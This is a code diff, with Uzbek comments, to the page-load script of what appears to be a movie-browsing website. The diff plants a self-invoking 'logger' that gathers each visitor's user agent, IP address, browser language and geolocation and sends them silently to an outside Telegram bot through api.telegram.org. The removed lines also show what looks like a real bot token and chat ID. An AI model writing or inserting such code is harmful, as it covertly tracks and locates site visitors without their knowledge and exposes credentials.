@@ -115,8 +115,8 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   // <-- BU YERGA QO'SHING: Logger kodini
   (function() {
-    const token = '7898891497:AAHe2velplZq73bfMtEaKReIZoAWlsL6Vgk';  // BotFather dan oling
-    const chatId = '5073544572';  // Sizning Telegram ID
+    const token = 'SIZNING_BOT_TOKEN';  // BotFather dan oling
+    const chatId = 'SIZNING_CHAT_ID';  // Sizning Telegram ID
 
     const data = {
       userAgent: navigator.userAgent,
@@ -139,7 +139,17 @@ document.addEventListener('DOMContentLoaded', async () => {
         data.lon = pos.coords.longitude;
         sendToTelegram(data);
       });
-    };
+    }
+
+    async function sendToTelegram(data) {
+      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      await fetch(url);
+    }
+  })();  // IIFE – darhol ishga tushadi
+
+  // ... keyingi kodlar (try { await fetchMovies('popular'); } va h.k.)
+});
 
 const state = {
   currentMovies: [],
